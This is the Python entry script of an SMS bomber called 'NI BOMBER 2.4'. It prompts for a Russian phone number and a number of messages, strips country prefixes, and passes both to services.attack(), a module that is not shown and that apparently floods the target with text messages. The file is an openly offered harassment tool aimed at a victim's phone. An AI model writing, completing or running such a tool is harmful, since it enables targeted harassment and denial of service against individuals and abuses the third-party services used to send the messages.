import requests
import datetime
import services


#header
print(f"NI BOMBER 2.4")

print()
print(f"coded by", end="")
print(f" >> ", end = "")
print(f"Andrei (L1mPeX) Kazarin")

#inputs
print('enter the number without or with prefixes (+7) (8)\nexample: 9018017010')
input_number = input('>> ')
print('how many sms to send?')
sms = int(input('>> '))


def parse_number(number):
	msg = f"check number - OK"
	if int(len(number)) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"check number - failed number!This bomber is intended only for Russia and if the number you entered belongs to another country then alas this bomber is not suitable for you!")
		quit()
	return number
number = parse_number(input_number)

services.attack(number, sms)
